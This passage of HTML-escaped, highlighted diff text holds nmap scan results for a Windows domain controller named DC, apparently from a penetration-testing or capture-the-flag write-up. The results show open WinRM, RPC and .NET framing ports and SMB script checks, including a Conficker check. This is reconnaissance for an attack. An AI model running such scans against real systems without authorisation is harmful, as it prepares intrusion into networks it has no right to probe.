+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;5985&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTPAPI&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SSDP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UPnP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HTTPAPI&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;2.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Found&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;9389&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nmf&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NET&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Message&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Framing&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;47001&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;          &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTPAPI&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SSDP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UPnP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Found&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HTTPAPI&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;2.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49664&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49665&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49666&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49667&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49668&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;58289&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;61803&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ncacn_http&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;over&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HTTP&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;61807&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;61809&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;61831&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;61864&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;syn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ttl&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;127&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CPE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cpe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windows&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;smb2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;04&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;02&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T19&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;45&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;start_date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;A&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_clock&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;skew&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h00m00s&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p2p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;conficker&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Conficker&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;higher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Check&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;35406&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CLEAN&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Couldn&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;t connect)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Check&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;29600&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CLEAN&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Couldn&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;t connect)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Check&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;52617&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;udp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CLEAN&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;receive&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Check&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;61528&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;udp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CLEAN&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Timeout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;checks&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;are&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;positive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CLEAN&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ports&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;are&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;blocked&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;smb2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
